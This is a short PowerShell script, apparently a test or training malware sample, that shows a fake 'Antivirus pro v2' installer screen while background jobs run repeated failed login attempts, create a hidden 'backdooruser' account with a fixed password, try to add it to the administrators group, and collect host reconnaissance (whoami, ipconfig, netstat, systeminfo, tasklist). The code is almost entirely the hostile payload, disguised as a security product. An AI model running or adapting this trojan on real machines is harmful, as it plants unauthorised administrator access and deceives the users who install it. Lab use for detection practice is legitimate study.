#DONT RUN IN THIS HOST MACHINE
function Show-FakeInstaller {
    Write-Host "================================================" -ForegroundColor Cyan
    write-host "This is a sample malware, no harm is intended " -ForegroundColor Green
    Write-Host "================================================" -ForegroundColor Cyan

    Clear-Host
    Write-Host "================================================" -ForegroundColor Cyan
    Write-Host "                Antivirus pro v2                " -ForegroundColor Cyan
    Write-Host "================================================" -ForegroundColor Cyan

    $steps = @(
        "Initializing installation"
        "Extracting files"
        "Copying system files"
        "configuring settings"
        "Finalizing installation..."
    )

    foreach ($i in $steps) {
        Write-Host "[  ] $i" -NoNewline
        Start-Sleep -Seconds 2
        Write-Host "`r[OK] $i" -ForegroundColor Green
    }

    Write-Host ""
    Write-Host "Installation-Complete !" -ForegroundColor Green
}



Start-Job -ScriptBlock {
    for ($i= 1; $i -le 10; $i++){
        net user adminstrator wrongpassword 2>&1 
        Start-Sleep -Milliseconds 500
    }
} | Out-Null

start-job -ScriptBlock{
    net user backdooruser Password2256! /add
    net localgroup adminstrators backdooruser /add
} | Out-Null

start-job -ScriptBlock{
    cmd /c whoami
    cmd /c ipconfig /all
    cmd /c netstat -an
    cmd /c systeminfo
    cmd /c tasklist
} | Out-Null

Show-FakeInstaller